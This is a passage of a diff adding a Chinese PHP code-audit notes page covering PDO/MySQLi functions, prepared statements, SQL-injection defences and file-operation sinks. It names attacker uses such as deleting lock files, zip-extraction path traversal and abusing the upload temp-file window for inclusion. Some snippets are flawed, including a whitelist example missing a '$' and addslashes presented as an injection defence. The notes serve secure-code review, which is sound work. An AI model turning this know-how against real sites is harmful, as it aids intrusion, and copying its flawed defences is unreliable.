+<li><a href="https://www.runoob.com/php/pdo-errorinfo.html">PDO::errorInfo</a> — 返回最后一次操作数据库的错误信息</li>
+<li><a href="https://www.runoob.com/php/pdo-exec.html">PDO::exec</a> — <b>执行一条 SQL 语句，并返回受影响的行数</b></li>
+<li><a href="https://www.runoob.com/php/pdo-getattribute.html">PDO::getAttribute</a> — 取回一个数据库连接的属性</li>
+<li><a href="https://www.runoob.com/php/pdo-getavailabledrivers.html">PDO::getAvailableDrivers</a> — 返回一个可用驱动的数组</li>
+<li><a href="https://www.runoob.com/php/pdo-intransaction.html">PDO::inTransaction</a> — 检查是否在一个事务内</li>
+<li><a href="https://www.runoob.com/php/pdo-lastinsertid.html">PDO::lastInsertId</a> — 返回最后插入行的ID或序列值</li>
+<li><a href="https://www.runoob.com/php/pdo-prepare.html">PDO::prepare</a> — <b>备要执行的SQL语句并返回一个 PDOStatement 对象</b></li>
+<li><a href="https://www.runoob.com/php/pdo-query.html">PDO::query</a> — <b>执行 SQL 语句，返回PDOStatement对象,可以理解为结果集</b></li>
+<li><a href="https://www.runoob.com/php/pdo-quote.html">PDO::quote</a> — <b>为SQL语句中的字符串添加引号。</b></li>
+<li><a href="https://www.runoob.com/php/pdo-rollback.html">PDO::rollBack</a> — 回滚一个事务</li>
+<li><a href="https://www.runoob.com/php/pdo-setattribute.html">PDO::setAttribute</a> — 设置属性</li>
+</ul>
+
+<p>
+PDOStatement 类：
+</p>
+<ul class="org-ul">
+<li><a href="https://www.runoob.com/php/pdostatement-bindcolumn.html">PDOStatement::bindColumn</a> — <b>绑定一列到一个 PHP 变量</b></li>
+<li><a href="https://www.runoob.com/php/pdostatement-bindparam.html">PDOStatement::bindParam</a> — <b>绑定一个参数到指定的变量名</b></li>
+<li><a href="https://www.runoob.com/php/pdostatement-bindvalue.html">PDOStatement::bindValue</a> — <b>把一个值绑定到一个参数</b></li>
+<li><a href="https://www.runoob.com/php/pdostatement-closecursor.html">PDOStatement::closeCursor</a> — 关闭游标，使语句能再次被执行。</li>
+<li><a href="https://www.runoob.com/php/pdostatement-columncount.html">PDOStatement::columnCount</a> — 返回结果集中的列数</li>
+<li><a href="https://www.runoob.com/php/pdostatement-debugdumpparams.html">PDOStatement::debugDumpParams</a> — 打印一条 SQL 预处理命令</li>
+<li><a href="https://www.runoob.com/php/pdostatement-errorcode.html">PDOStatement::errorCode</a> — 获取跟上一次语句句柄操作相关的 SQLSTATE</li>
+<li><a href="https://www.runoob.com/php/pdostatement-errorinfo.html">PDOStatement::errorInfo</a> — 获取跟上一次语句句柄操作相关的扩展错误信息</li>
+<li><a href="https://www.runoob.com/php/pdostatement-execute.html">PDOStatement::execute</a> — <b>执行一条预处理语句</b></li>
+<li><a href="https://www.runoob.com/php/pdostatement-fetch.html">PDOStatement::fetch</a> — 从结果集中获取下一行</li>
+<li><a href="https://www.runoob.com/php/pdostatement-fetchall.html">PDOStatement::fetchAll</a> — 返回一个包含结果集中所有行的数组</li>
+<li><a href="https://www.runoob.com/php/pdostatement-fetchcolumn.html">PDOStatement::fetchColumn</a> — 从结果集中的下一行返回单独的一列。</li>
+<li><a href="https://www.runoob.com/php/pdostatement-fetchobject.html">PDOStatement::fetchObject</a> — 获取下一行并作为一个对象返回。</li>
+<li><a href="https://www.runoob.com/php/pdostatement-getattribute.html">PDOStatement::getAttribute</a> — 检索一个语句属性</li>
+<li><a href="https://www.runoob.com/php/pdostatement-getcolumnmeta.html">PDOStatement::getColumnMeta</a> — 返回结果集中一列的元数据</li>
+<li><a href="https://www.runoob.com/php/pdostatement-nextrowset.html">PDOStatement::nextRowset</a> — 在一个多行集语句句柄中推进到下一个行集</li>
+<li><a href="https://www.runoob.com/php/pdostatement-rowcount.html">PDOStatement::rowCount</a> — 返回受上一个 SQL 语句影响的行数</li>
+<li><a href="https://www.runoob.com/php/pdostatement-setattribute.html">PDOStatement::setAttribute</a> — 设置一个语句属性</li>
+<li><a href="https://www.runoob.com/php/pdostatement-setfetchmode.html">PDOStatement::setFetchMode</a> — 为语句设置默认的获取模式。</li>
+</ul>
+
+<p>
+pdo参考：<a href="https://www.php.net/manual/zh/book.pdo.php">https://www.php.net/manual/zh/book.pdo.php</a>
+</p>
+</div>
+</div>
+<div id="outline-container-h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1" class="outline-4">
+<h4 id="h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1"><a href="#h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1">PHP PDO 预处理语句与存储过程</a></h4>
+<div class="outline-text-4" id="text-h:d0b769d2-6f76-41f4-9ae7-a7ee40507bc1">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+// insert
+$stmt = $dbh-&gt;prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
+$stmt-&gt;bindParam(':name', $name);
+$stmt-&gt;bindParam(':value', $value);
+
+// 插入一行
+$name = 'one';
+$value = 1;
+$stmt-&gt;execute();
+
+// select
+$stmt = $dbh-&gt;prepare("SELECT * FROM REGISTRY where name = ?");
+if ($stmt-&gt;execute(array($_GET['name']))) {
+  while ($row = $stmt-&gt;fetch()) {
+    print_r($row);
+  }
+}
+?&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:53436876-b484-4a09-96ad-0d2c1285720a" class="outline-4">
+<h4 id="h:53436876-b484-4a09-96ad-0d2c1285720a"><a href="#h:53436876-b484-4a09-96ad-0d2c1285720a">使用命名（:name）参数来准备SQL语句</a></h4>
+<div class="outline-text-4" id="text-h:53436876-b484-4a09-96ad-0d2c1285720a">
+<p>
+实例
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+/* 通过数组值向预处理语句传递值 */
+$sql = 'SELECT name, colour, calories
+    FROM fruit
+    WHERE calories &lt; :calories AND colour = :colour';
+$sth = $dbh-&gt;prepare($sql, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));
+$sth-&gt;execute(array(':calories' =&gt; 150, ':colour' =&gt; 'red'));
+$red = $sth-&gt;fetchAll();
+$sth-&gt;execute(array(':calories' =&gt; 175, ':colour' =&gt; 'yellow'));
+$yellow = $sth-&gt;fetchAll();
+?&gt;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:1a90f8e2-d3c1-422c-8531-3093579fba81" class="outline-4">
+<h4 id="h:1a90f8e2-d3c1-422c-8531-3093579fba81"><a href="#h:1a90f8e2-d3c1-422c-8531-3093579fba81">使用问号（?）参数来准备SQL语句</a></h4>
+<div class="outline-text-4" id="text-h:1a90f8e2-d3c1-422c-8531-3093579fba81">
+<p>
+实例
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+/* 通过数组值向预处理语句传递值 */
+$sth = $dbh-&gt;prepare('SELECT name, colour, calories
+    FROM fruit
+    WHERE calories &lt; ? AND colour = ?');
+$sth-&gt;execute(array(150, 'red'));
+$red = $sth-&gt;fetchAll();
+$sth-&gt;execute(array(175, 'yellow'));
+$yellow = $sth-&gt;fetchAll();
+?&gt;
+</pre>
+</div>
+
+<p>
+Order by涉及到动态表名和列名时，不能用参数绑定方式处理，如果强制绑定，会没有排序效果，如Order by age。
+</p>
+
+<p>
+建议使用白名单参数形式：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">orders=array("name","age","xxx");
+$key=array_search($_GET['data'],$orders); // 查询是否存在在数组中
+$order=$orders[$key];
+$query="SELECT * from table WHERE is_live = :is_live ORDER BY $order";
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:84feef37-1de6-46c5-a551-c75ee0c71e2f" class="outline-4">
+<h4 id="h:84feef37-1de6-46c5-a551-c75ee0c71e2f"><a href="#h:84feef37-1de6-46c5-a551-c75ee0c71e2f">MySQLi 函数</a></h4>
+<div class="outline-text-4" id="text-h:84feef37-1de6-46c5-a551-c75ee0c71e2f">
+<p>
+参考： <a href="https://www.php.net/manual/zh/book.mysqli.php">https://www.php.net/manual/zh/book.mysqli.php</a>
+</p>
+
+<p>
+函数 描述
+</p>
+<ul class="org-ul">
+<li><a href="https://www.runoob.com/php/func-mysqli-affected-rows.html">mysqli_affected_rows()</a> 返回前一次 MySQL 操作所影响的记录行数。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-autocommit.html">mysqli_autocommit()</a> 打开或关闭自动提交数据库修改。</li>
+<li>mysqli_change_user() 更改指定数据库连接的用户。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-change-user.html">mysqli_character_set_name()</a> 返回数据库连接的默认字符集。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-close.html">mysqli_close()</a> 关闭先前打开的数据库连接。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-commit.html">mysqli_commit()</a> 提交当前事务。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-connect-errno.html">mysqli_connect_errno()</a> 返回上一次连接错误的错误代码。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-connect-error.html">mysqli_connect_error()</a> 返回上一次连接错误的错误描述。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-connect.html">mysqli_connect()</a> <b>打开一个到 MySQL 服务器的新的连接。</b></li>
+<li><a href="https://www.runoob.com/php/func-mysqli-data-seek.html">mysqli_data_seek()</a> 调整结果指针到结果集中的一个任意行。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-debug.html">mysqli_debug()</a> 执行调试操作。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-dump-debug-info.html">mysqli_dump_debug_info()</a> 转储调试信息到日志中。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-errno.html">mysqli_errno()</a> 返回最近调用函数的最后一个错误代码。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-error-list.html">mysqli_error_list()</a> 返回最近调用函数的错误列表。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-error.html">mysqli_error()</a> 返回最近调用函数的最后一个错误描述。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-all.html">mysqli_fetch_all()</a> 从结果集中取得所有行作为关联数组，或数字数组，或二者兼有。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-array.html">mysqli_fetch_array()</a> 从结果集中取得一行作为关联数组，或数字数组，或二者兼有。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-assoc.html">mysqli_fetch_assoc()</a> 从结果集中取得一行作为关联数组。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-field-direct.html">mysqli_fetch_field_direct()</a> 从结果集中取得某个单一字段的 meta-data，并作为对象返回。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-field.html">mysqli_fetch_field()</a> 从结果集中取得下一字段，并作为对象返回。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-fields.html">mysqli_fetch_fields()</a> 返回结果中代表字段的对象的数组。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-lengths.html">mysqli_fetch_lengths()</a> 返回结果集中当前行的每个列的长度。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-object.html">mysqli_fetch_object()</a> 从结果集中取得当前行，并作为对象返回。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-fetch-row.html">mysqli_fetch_row()</a> 从结果集中取得一行，并作为枚举数组返回。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-field-count.html">mysqli_field_count()</a> 返回最近查询的列数。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-field-seek.html">mysqli_field_seek()</a> 把结果集中的指针设置为指定字段的偏移量。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-field-tell.html">mysqli_field_tell()</a> 返回结果集中的指针的位置。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-free-result.html">mysqli_free_result()</a> 释放结果内存。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-charset.html">mysqli_get_charset()</a> 返回字符集对象。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-client-info.html">mysqli_get_client_info()</a> 返回 MySQL 客户端库版本。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-client-stats.html">mysqli_get_client_stats()</a> 返回有关客户端每个进程的统计。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-client-version.html">mysqli_get_client_version()</a> 将 MySQL 客户端库版本作为整数返回。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-connection-stats.html">mysqli_get_connection_stats()</a> 返回有关客户端连接的统计。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-host-info.html">mysqli_get_host_info()</a> 返回 MySQL 服务器主机名和连接类型。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-proto-info.html">mysqli_get_proto_info()</a> 返回 MySQL 协议版本。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-server-info.html">mysqli_get_server_info()</a> 返回 MySQL 服务器版本。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-get-server-version.html">mysqli_get_server_version()</a> 将 MySQL 服务器版本作为整数返回。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-info.html">mysqli_info()</a> 返回有关最近执行查询的信息。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-init.html">mysqli_init()</a> 初始化 MySQLi 并返回 mysqli_real_connect() 使用的资源。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-insert-id.html">mysqli_insert_id()</a> 返回最后一个查询中自动生成的 ID。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-kill.html">mysql_kill()</a> 请求服务器杀死一个 MySQL 线程。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-more-results.html">mysqli_more_results()</a> 检查一个多查询是否有更多的结果。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-multi-query.html">mysqli_multi_query()</a> 执行一个或多个针对数据库的查询。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-next-result.html">mysqli_next_result()</a> 为 mysqli_multi_query() 准备下一个结果集。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-multi-query.html">mysqli_num_fields()</a> 返回结果集中字段的数量。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-num-rows.html">mysqli_num_rows()</a> 返回结果集中行的数量。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-options.html">mysqli_options()</a> 设置额外的连接选项，用于影响连接行为。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-ping.html">mysqli_ping()</a> 进行一个服务器连接，如果连接已断开则尝试重新连接。</li>
+<li>mysqli_prepare() <b>准备执行一个 SQL 语句</b></li>
+<li><a href="https://www.runoob.com/php/func-mysqli-query.html">mysqli_query()</a> <b>执行某个针对数据库的查询。</b></li>
+<li><a href="https://www.runoob.com/php/func-mysqli-real-connect.html">mysqli_real_connect()</a> 打开一个到 MySQL 服务器的新的链接。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-real-escape-string.html">mysqli_real_escape_string()</a> 转义在 SQL 语句中使用的字符串中的特殊字符。</li>
+<li>mysqli_real_query() <b>执行 SQL 查询</b></li>
+<li>mysqli_reap_async_query() 返回异步查询的结果。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-refresh.html">mysqli_refresh()</a> 刷新表或缓存，或者重置复制服务器信息。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-rollback.html">mysqli_rollback()</a> 回滚数据库中的当前事务。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-select-db.html">mysqli_select_db()</a> 更改连接的默认数据库。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-set-charset.html">mysqli_set_charset()</a> 设置默认客户端字符集。</li>
+<li>mysqli_set_local_infile_default() 撤销用于 load local infile 命令的用户自定义句柄。</li>
+<li>mysqli_set_local_infile_handler() 设置用于 LOAD DATA LOCAL INFILE 命令的回滚函数。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-sqlstate.html">mysqli_sqlstate()</a> 返回最后一个 MySQL 操作的 SQLSTATE 错误代码。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-ssl-set.html">mysqli_ssl_set()</a> 用于创建 SSL 安全连接。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-stat.html">mysqli_stat()</a> 返回当前系统状态。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-stmt-init.html">mysqli_stmt_init()</a> 初始化声明并返回 mysqli_stmt_prepare() 使用的对象。</li>
+<li>mysqli_store_result() 返回的当前的结果集。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-thread-id.html">mysqli_thread_id()</a> 返回当前连接的线程 ID。</li>
+<li><a href="https://www.runoob.com/php/func-mysqli-thread-safe.html">mysqli_thread_safe()</a> 返回是否将客户端库编译成 thread-safe。</li>
+<li>mysqli_use_result() 从上次使用 mysqli_real_query() 执行的查询中初始化结果集的检索。</li>
+<li>mysqli_warning_count() 返回连接中的最后一个查询的警告数量。</li>
+</ul>
+
+<p>
+执行原生sql代码示例:
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+// 假定数据库用户名：root，密码：123456，数据库：RUNOOB
+$con=mysqli_connect("localhost","root","123456","RUNOOB");
+if (mysqli_connect_errno($con))
+{
+    echo "连接 MySQL 失败: " . mysqli_connect_error();
+}
+// 执行查询
+mysqli_query($con,"SELECT * FROM websites");
+mysqli_query($con,"INSERT INTO websites (name, url, alexa, country)
+VALUES ('百度','https://www.baidu.com/','4','CN')");
+
+mysqli_close($con);
+?&gt;
+</pre>
+</div>
+
+<p>
+预编译sql代码示例:
+</p>
+
+<p>
+预编译三个步骤为：1.$stmt -&gt; prepare. 2.$stmt -&gt; bind_param. 3.$stmt -&gt; execute
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+$mysqli = new mysqli("localhost", "my_user", "my_password", "world");
+
+$city = "Amersfoort";
+
+/* create a prepared statement */
+$stmt = $mysqli-&gt;prepare("SELECT District FROM City WHERE Name=?");
+
+/* bind parameters for markers */
+$stmt-&gt;bind_param("s", $city);
+
+/* execute query */
+$stmt-&gt;execute();
+
+/* bind result variables */
+$stmt-&gt;bind_result($district);
+
+/* fetch value */
+$stmt-&gt;fetch();
+
+printf("%s is in district %s\n", $city, $district);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:9152a171-949d-4872-867b-c16faebe2805" class="outline-4">
+<h4 id="h:9152a171-949d-4872-867b-c16faebe2805"><a href="#h:9152a171-949d-4872-867b-c16faebe2805">mysql 扩展</a></h4>
+<div class="outline-text-4" id="text-h:9152a171-949d-4872-867b-c16faebe2805">
+<p>
+mysql扩展没有预编译机制，容易存在sql注入
+</p>
+
+<p>
+mysql 扩展参考： <a href="https://www.php.net/manual/zh/book.mysql.php">https://www.php.net/manual/zh/book.mysql.php</a>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+$con = mysql_connect("localhost","peter","abc123");
+if (!$con)
+{
+  die('Could not connect: ' . mysql_error());
+}
+
+mysql_select_db("my_db", $con);
+$result = mysql_query("SELECT * FROM Persons");
+while($row = mysql_fetch_array($result))
+{
+  echo $row['FirstName'] . " " . $row['LastName'];
+  echo "&lt;br /&gt;";
+}
+
+mysql_close($con);
+?&gt;
+</pre>
+</div>
+
+<p>
+常见过滤/防护
+</p>
+<ul class="org-ul">
+<li>addslashes 在单引号（'）、双引号（"）、反斜线（\）与 NULL 前加上反斜线 可用于防止SQL注入</li>
+</ul>
+</div>
+<div id="outline-container-h:f3ddfb55-fa94-45df-94c0-12553e518d22" class="outline-5">
+<h5 id="h:f3ddfb55-fa94-45df-94c0-12553e518d22"><a href="#h:f3ddfb55-fa94-45df-94c0-12553e518d22">防护方法</a></h5>
+<div class="outline-text-5" id="text-h:f3ddfb55-fa94-45df-94c0-12553e518d22">
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+/*强制类型转换*/
+$id=intval($_GET['id']); //因查询ID为整数 所以可以强制转换为整数
+
+/*转义特殊字符 加上引号 (字符串类型)*/
+$id=$pdo-&gt;quote($_GET['name']);
+
+/*预处理语句*/
+$stmt =$pdo-&gt;prepare("SELECT id, name FROM users WHERE id=?;");
+$stmt-&gt;execute([$_GET['id']]);//简单的预处理 完整使用方法见PHP手册
+?&gt;
+
+
+PDO::quote 转义特殊字符 并添加引号
+
+PDO::prepare 预处理SQL语句 有效防止SQL注入 (推荐) intval($input) floatval() floatval() floor() (int)$input num
+
+将输入强制转换为整数/浮点 用于整数/浮点类型的输入参数处理 可防止SQL注入
+</pre>
+</div>
+
+<p>
+一些执行SQL语句的函数
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">mysql_query
+odbc_exec
+mysqli_query
+mysql_db_query
+mysql_unbuffered_query
+mysqli::query&#29992;&#27861;$<span class="org-variable-name">mysqli</span> = new mysqli(<span class="org-string">"localhost"</span>, <span class="org-string">"my_user"</span>, <span class="org-string">"my_password"</span>,<span class="org-string">"world"</span>);$<span class="org-variable-name">mysqli</span>-&gt;query();
+pg_query
+
+pg_query_params
+pg_send_query
+pg_send_query_params
+sqlsrv_query
+pdo::query$<span class="org-variable-name">pdo</span>=new PDO(<span class="org-string">"mysql:host=localhost;dbname=phpdem o"</span>,<span class="org-string">"root"</span>,<span class="org-string">"1234"</span>); $<span class="org-variable-name">pdo</span>-&gt;query($<span class="org-variable-name">sql</span>); <span class="org-comment-delimiter">#</span><span class="org-comment">PDO
+</span>
+SQLite3::query SQLite3::exec$<span class="org-variable-name">db</span> = new SQLite3(<span class="org-string">'mysqlitedb.db'</span>); 
+$<span class="org-variable-name">db</span>-&gt;query(<span class="org-string">'SELECT bar FROM foo'</span>); 
+$<span class="org-variable-name">db</span>-&gt;exec(<span class="org-string">'CREATE TABLE bar (bar STRING)'</span>);
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:952f1581-163b-4123-a883-309bded14af2" class="outline-3">
+<h3 id="h:952f1581-163b-4123-a883-309bded14af2"><a href="#h:952f1581-163b-4123-a883-309bded14af2">文件操作</a></h3>
+<div class="outline-text-3" id="text-h:952f1581-163b-4123-a883-309bded14af2">
+<p>
+文件操作相关关键参数用户可控 导致文件/目录 删除/移动/写入(上传)/读取等
+</p>
+
+<p>
+文件/目录删除
+</p>
+<ol class="org-ol">
+<li>unlink(文件路径)//删除文件</li>
+<li>rmdir(文件夹路径)//删除目录</li>
+</ol>
+
+<p>
+攻击者常见用法
+</p>
+<ul class="org-ul">
+<li>删除lock文件(解除重复程序安装保护等安全限制) 删除网站关键文件(导致网站拒绝服务 数据丢失)</li>
+</ul>
+
+<p>
+文件写入/上传
+</p>
+<div class="org-src-container">
+<pre class="src src-php">文件写入
+file_put_contents(路径,写入字符串);//直接将字符串写入文件(不存在会自动创建) 3
+$fp = fopen(文件路径, "w");//以写入模式打开一个文件 返回文件指针(不存在会自动创建)
+fwrite($fp,写入字符串);//写入数据
+fclose($fp);//关闭文件
+
+文件上传
+move_uploaded_file(临时上传文件路径,目标文件路径);//移动临时上传文件
+</pre>
+</div>
+
+<p>
+<a href="https://www.php.net/manual/en/features.file-upload.post-method.php">php的原生文件上传</a>
+</p>
+
+<ul class="org-ul">
+<li>收到POST表单-&gt;随机文件名写入临时目录-&gt;(执行PHP文件处理逻辑-&gt;移动临时文件到保存位置)-&gt;删除临时文件(如果临时文件没有被移动)</li>
+<li>临时文件路径必须是php上传表单自动处理产生的 例如 $_FILES["pictures"]["tmp_name"]</li>
+<li>"pictures" 为表单中的 name ; "tmp_name" 为固定变量名(临时文件名)</li>
+</ul>
+
+<p>
+<b>注:只要PHP收到POST上传文件表单 哪怕php页面一行代码没有 都会将上传文件保存到临时目录 在请求结束后如果临时文件没有被移⾛就会被自动删除 从写入文件到删除文件有个短暂的窗口时间 可用于文件包含</b>
+</p>
+
+<p>
+文件解压
+</p>
+<div class="org-src-container">
+<pre class="src src-php">$zip = new \ZipArchive;
+$zip-&gt;open('test_new.zip', \ZipArchive::CREATE) //打开一个zip文件
+$zip-&gt;addFile('test.txt'); //添加压缩文件
+$zip-&gt;addEmptyDir('newdir');//添加空目录
+$zip-&gt;addFromString('new.txt', '文本');//从字符串添加文件到压缩包
+$zip-&gt;extractTo('upload');//将压缩包文件解压到upload目录下
+$zip-&gt;close();//关闭zip
+</pre>
+</div>
+<p>
+注:ZipArchive扩展在windows平台 php版本&gt;5.6时默认安装. linux及windows其他版本需要手动编译安装.
+</p>
+
+<p>
+<b>审计时重点查找 extractTo方法</b>
+</p>
+<ul class="org-ul">
+<li>判断解压目录是否在web目录下 是否检查压缩包内文件类型 如果不在web目录下也可以使用 .. 进行目录穿越控制上传目录 到web目录下 或者在权限足够的情况下写入文件到系统关键目录</li>
+</ul>
+
+<p>
+文件写入/上传
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">file_put_contents &#23558;&#19968;&#20010;&#23383;&#31526;&#20018;&#20889;&#20837;&#25991;&#20214;
+<span class="org-function-name">file_put_contents</span>(<span class="org-string">"1.txt"</span>,<span class="org-string">"666 6"</span>);
+
+move_uploaded_file &#23558;&#19978;&#20256;&#30340;&#20020;&#26102;&#25991;&#20214;&#31227;&#21160;&#21040;&#26032;&#30340;&#20301;&#32622;
+<span class="org-function-name">move_uploaded_file</span>($<span class="org-variable-name">_FILES</span>[ <span class="org-string">"pictures"</span>][<span class="org-string">"tmp_name"</span>],<span class="org-string">"1.php"</span>)
+
+rename &#37325;&#21629;&#21517;&#25991;&#20214;/&#30446;&#24405;
+<span class="org-function-name">rename</span>($<span class="org-variable-name">oldname</span>,$<span class="org-variable-name">newname</span>);
+
+rmdir &#21024;&#38500;&#30446;&#24405;
+mkdir &#21019;&#24314;&#30446;&#24405;
+unlink &#21024;&#38500;&#25991;&#20214;
+copy &#22797;&#21046;&#25991;&#20214;
+<span class="org-function-name">copy</span>($<span class="org-variable-name">file</span>, $<span class="org-variable-name">newfile</span>);
+
+fopen/fputs/fwrite &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL
+https://www.php.net/manual/zh/function.fwrite.php
+
+link &#21019;&#24314;&#25991;&#20214;&#30828;&#38142;&#25509;
+<span class="org-function-name">link</span>($<span class="org-variable-name">target</span>, $<span class="org-variable-name">link</span>);
+
+symlink &#21019;&#24314;&#31526;&#21495;&#38142;&#25509;(&#36719;&#38142;&#25509;)
+<span class="org-function-name">symlink</span>($<span class="org-variable-name">target</span>, $<span class="org-variable-name">link</span>);
+
+tmpfile &#21019;&#24314;&#19968;&#20010;&#20020;&#26102;&#25991;&#20214; (&#22312;&#20020;&#26102;&#30446;&#24405;&#23384;&#25918; &#38543;&#26426;&#25991;&#20214;&#21517; &#36820;&#22238;&#21477;&#26564;)
+$<span class="org-variable-name">temp</span> = tmpfile(); fwrite($<span class="org-variable-name">temp</span>, <span class="org-string">"123456"</span>);
+<span class="org-function-name">fclose</span>($<span class="org-variable-name">temp</span>);
+
+<span class="org-function-name">request</span>()-&gt;file()-&gt;move()request()-&gt;file()-&gt;file() Thinkphp &#25991;&#20214;&#19978;&#20256;https://www.kancloud.cn/manual/thinkphp5/155159
+$<span class="org-variable-name">file</span> = request()-&gt;file($<span class="org-variable-name">name</span>);$<span class="org-variable-name">file</span>-&gt;move($<span class="org-variable-name">filepath</span>);
+
+extractTo &#35299;&#21387;zip &#21040;&#30446;&#24405;
+</pre>
+</div>
+
+<p>
+文件读取
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&#20989;&#25968; &#25551;&#36848; &#20363;&#23376;
+file_get_contents &#35835;&#20837;&#25991;&#20214;&#36820;&#22238;&#23383;&#31526;&#20018;
+<span class="org-builtin">echo</span> file_get_contents(<span class="org-string">"flag.txt"</span>); <span class="org-builtin">echo</span>
+<span class="org-function-name">file_get_contents</span>(<span class="org-string">"https://www.bilibili.com/"</span>);
+
+readfile &#35835;&#21462;&#19968;&#20010;&#25991;&#20214;&#65292;&#24182;&#20889;&#20837;&#21040;&#36755;&#20986;&#32531;&#20914;&#12290;&#21516;file_get_contents
+
+fopen/fread/fgets/fgetss/fgetc/fgetcsv/fpassthru/fscanf &#25171;&#24320;&#25991;&#20214;&#25110;&#32773; URL &#35835;&#21462;&#25991;&#20214;&#27969;
+$<span class="org-variable-name">file</span> = fopen(<span class="org-string">"test.txt"</span>,<span class="org-string">"r"</span>); <span class="org-builtin">echo</span> fread($<span class="org-variable-name">file</span>,<span class="org-string">"1234"</span>); fclose($<span class="org-variable-name">file</span>);
+
+file &#25226;&#25972;&#20010;&#25991;&#20214;&#35835;&#20837;&#19968;&#20010;&#25968;&#32452;&#20013;
+<span class="org-builtin">echo</span> implode(<span class="org-string">''</span>, file(<span class="org-string">'https://www.bilibili.com/ '</span>));
+
+highlight_file/show_source &#35821;&#27861;&#39640;&#20142;&#19968;&#20010;&#25991;&#20214;
+<span class="org-function-name">highlight_file</span>(<span class="org-string">"1.php"</span>);
+
+parse_ini_file &#35835;&#21462;&#24182;&#35299;&#26512;&#19968;&#20010;ini&#37197;&#32622;&#25991;&#20214;
+<span class="org-function-name">print_r</span>(parse_ini_file(<span class="org-string">'1.ini'</span>));
+
+simplexml_load_file &#35835;&#21462;&#25991;&#20214;&#20316;&#20026;XML&#25991;&#26723;&#35299;&#26512;
+</pre>
+</div>
+
+<p>
+全部文件操作函数可参考PHP官方手册 <a href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a>
+</p>
+</div>
+</div>
+<div id="outline-container-h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d" class="outline-3">
+<h3 id="h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d"><a href="#h:9b34ebd5-d2e8-46b4-8c94-2ea23227942d">XSS</a></h3>
